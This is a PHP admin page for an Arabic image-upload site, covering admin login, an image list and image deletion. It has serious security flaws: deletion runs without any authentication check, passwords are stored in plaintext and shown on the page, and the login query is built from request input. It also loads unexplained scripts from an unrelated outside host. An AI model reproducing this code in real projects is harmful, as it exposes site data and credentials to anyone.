<?php


session_name('LoginForm');
@session_start();

error_reporting(0);
include("config.php");

?>
<?php



	require_once 'dbconfig.php';

	

	if(isset($_GET['delete_id']))

	{

		// select image from db to delete

		$stmt_select = $DB_con->prepare('SELECT userPic FROM tbl_users WHERE userID =:uid');

		$stmt_select->execute(array(':uid'=>$_GET['delete_id']));

		$imgRow=$stmt_select->fetch(PDO::FETCH_ASSOC);

		unlink("/reem/".$imgRow['userPic']);

		

		// it will delete an actual record from db

		$stmt_delete = $DB_con->prepare('DELETE FROM tbl_users WHERE userID =:uid');

		$stmt_delete->bindParam(':uid',$_GET['delete_id']);

		$stmt_delete->execute();

		

		header("Location: admin.php");



	}



?>
<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->

    <head>
<style>
    body { padding-top: 1px; }
    </style>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>ادمن الصور : عصر الوابكا</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <!-- Place favicon.ico and apple-touch-icon.png in the root directory -->

        <link rel="stylesheet" href="css/main.css">
        <link href='http://fonts.googleapis.com/css?family=Roboto:400,300,500' rel='stylesheet' type='text/css'>
        <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
        <script src="js/jquery-1.8.2.min.js"></script>
        <script src="js/jquery.validate.min.js"></script>
        <script src="js/main.js"></script>
    </head>
    <body>
<?php
	$error = '';
	if(isset($_POST['is_login'])){
		$sql = "SELECT * FROM ".$SETTINGS["USERS"]." WHERE `email` = '".mysql_real_escape_string($_POST['email'])."' AND `password` = '".mysql_real_escape_string($_POST['password'])."'";
		$sql_result = mysql_query ($sql, $connection ) or die ('request "Could not execute SQL query" '.$sql);
		$user = mysql_fetch_assoc($sql_result);
		if(!empty($user)){
			$_SESSION['user_info'] = $user;
			$query = " UPDATE ".$SETTINGS["USERS"]." SET last_login = NOW() WHERE id=".$user['id'];
			mysql_query ($query, $connection ) or die ('request "Could not execute SQL query" '.$query);
		}
		else{
			$error = 'Wrong email or password.';
		}
	}
	
	if(isset($_GET['ac']) && $_GET['ac'] == 'logout'){
		$_SESSION['user_info'] = null;
		unset($_SESSION['user_info']);
	}
?>
	<?php if(isset($_SESSION['user_info']) && is_array($_SESSION['user_info'])) { ?>

	    <form id="login-form" class="login-form" name="form1">

	        <div id="form-content">
                    
<p class="a11">
<small>
مرحبا بك يا :
(<?php echo $_SESSION['user_info']['name']  ?>)
<br>
بريدك :
(<?php echo $_SESSION['user_info']['email']  ?>) 
<br>
كلمة السر الخاصه بك : 
(<?php echo $_SESSION['user_info']['password']  ?>
)
<br>
اخر دخول 
(<?php echo $_SESSION['user_info']['last_login']  ?>
)

<br>
اخر اي بي تم تسجيلة (<?PHP function getUserIP() { $client = @$_SERVER['HTTP_CLIENT_IP']; $forward = @$_SERVER['HTTP_X_FORWARDED_FOR']; $remote = $_SERVER['REMOTE_ADDR']; if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; } elseif(filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; } else { $ip = $remote; } return $ip; } $user_ip = getUserIP(); echo $user_ip; ?>)
<br>( <a href="admin.php?ac=logout" style="color:#3ec038">تسجيل خروج</a>) - ( <a href="/update" style="color:#3ec038">تحديثات النظام</a>)
<hr/>
</small>
</p>
<!DOCTYPE html>
<html lang="ar">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>مركز تحميل <?php echo $namesite?></title>

    <!-- استايل البوت ستراب -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
<?php include('inc/styled.php');?>

    <!-- تخصيص الاستايل -->

    <!-- التجاوب -->
    <!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<script src="http://cdn-ye.yn.lt/3sr/s1.js"></script>
<script async="true" src="http://cdn-ye.yn.lt/3sr/s2.js"></script>
    <![endif]-->
<?php include('inc/rights.php');?>
</head>

<body>

    <!-- بداية الصفحة -->

           
          
            

          
               
<?php

	

	$stmt = $DB_con->prepare('SELECT userID, userName, userProfession, userPic FROM tbl_users ORDER BY userID DESC');

	$stmt->execute();

	

	if($stmt->rowCount() > 0)

	{

		while($row=$stmt->fetch(PDO::FETCH_ASSOC))

		{

			extract($row);

			?>


                <p class="a5" align="center">
<a href="<?php echo $folder?>/<?php echo $row['userPic']; ?>"><img src="<?php echo $folder?>/<?php echo $row['userPic']; ?>" class="img-circle" alt="Aljnet Up 5.0.0" width="70" height="70"/></a>


 <a class="btn btn-xs btn-danger" href="?delete_id=<?php echo $row['userID']; ?>" title="اضغط للحذف" onclick="return confirm('هل تريد حذف الصورة ?')">حذف</a>

	<?php

		}

	}

	else

	{

		?>

 </div>
<div class="a5" align="center">
	<span class="glyphicon glyphicon-info-sign"></span> &nbsp;  لايوجـــد صـــور 
</div>
   <?php

	}

	

?>

</p>
           
    </div>
    <!-- /نهاية الصفحة -->

  <!-- بداية الفوتر -->
<div id="footer">
<?php include('inc/footer.php'); ?>
</div>
  <!-- /نهاية الفوتر -->

    <!-- الجيكويري -->
    <script src="js/jquery.js"></script>

    <!-- البوت ستراب -->
    <script src="js/bootstrap.min.js"></script>

</body>

</html>
                    
                   
	        </div>
	
	    </form>
        
	<?php } else { ?>
	    <form id="login-form" class="login-form" name="form1" method="post" action="admin.php">
	    	<input type="hidden" name="is_login" value="1">
	        <div class="h1">دخول الادمن</div>
	        <div id="form-content">
	            <div class="group">
	                <label for="email">البريد الالكتروني</label>
	                <div><input id="email" name="email" class="form-control required" type="email" placeholder="ادخل بريدك الالكتروني"></div>
	            </div>
	           <div class="group">
	                <label for="name">كلمة المرور</label>
	                <div><input id="password" name="password" class="form-control required" type="password" placeholder="ادخل كلمة المرور"></div>
	            </div>
	            <?php if($error) { ?>
	                <em>
						<label class="err" for="password" generated="true" style="display: block;"><?php echo $error ?></label>
					</em>
				<?php } ?>

  <div class="group submit">
<a href="http://regup.ga/call.php" style="color:#3ec038">نسيت بيانات الدخول؟</a>
</div>
	            <div class="group submit">
	                <label class="empty"></label>
	                <div><input name="submit" type="submit" value="دخول"/></div>
	            </div>
	        </div>
	        <div id="form-loading" class="hide"><i class="fa fa-circle-o-notch fa-spin"></i></div>
	    </form>
	<?php } ?>   
    </body>
</html>
